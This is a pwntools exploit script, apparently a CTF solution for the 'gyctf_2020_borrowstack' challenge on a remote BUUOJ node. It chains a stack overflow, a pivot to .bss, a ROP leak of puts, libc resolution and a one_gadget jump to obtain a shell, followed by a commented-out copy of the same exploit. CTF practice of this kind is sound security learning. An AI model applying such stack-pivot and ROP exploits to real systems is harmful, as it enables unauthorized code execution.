from pwn import *
from LibcSearcher import *
# 64位经典栈迁移

p = remote('node4.buuoj.cn', 25193)
# p = process('./gyctf_2020_borrowstack')
e = ELF('./gyctf_2020_borrowstack')
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'
leave_ret = 0x400699
ret = 0x4004c9
bss = 0x601080
pop_rdi_ret = 0x400703
main_addr = 0x400626

one_gadget = 0x4526a

payload1 = b'a'*0x60 + p64(bss) + p64(leave_ret)
p.recvuntil(b'you want\n')
p.send(payload1)

# 抬高栈，防止rop过程破坏got表
payload2 = p64(ret)*20 + p64(pop_rdi_ret) + p64(e.got['puts']) + p64(e.plt['puts']) + p64(main_addr)
# payload2 = p64(ret)*18+p64(main_addr)
p.recvuntil(b'stack now!\n')
p.send(payload2)

puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')

payload3 = b'a'*0x60 + p64(bss) + p64(libc_base + one_gadget)
# payload4 = p64(pop_rdi_ret) + p64(binsh) + p64(system)
p.send(payload3)
p.sendline()
p.interactive()

# pop_rdi_ret = 0x400703
# leave_ret = 0x400699
# puts_plt = e.plt['puts']
# puts_got = e.got['puts']
# back_to_read = 0x400680
# bss_addr = 0x601080
# offset = 0x60
# ret=0x4004c9


# payload1 = offset*b'A' + p64(bss_addr) + p64(leave_ret)
# payload2 = p64(ret) * 20 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(e.sym['main'])

# p.recv()
# p.send(payload1)
# p.recv()
# p.send(payload2)
# puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

# libc = LibcSearcher('puts',puts_addr)
# libc_base = puts_addr - libc.dump('puts')

# payload3 = offset*b'A' + p64(bss_addr) + p64(libc_base + one_gadget)
# p.sendline(payload3)
# p.sendline()

# p.interactive()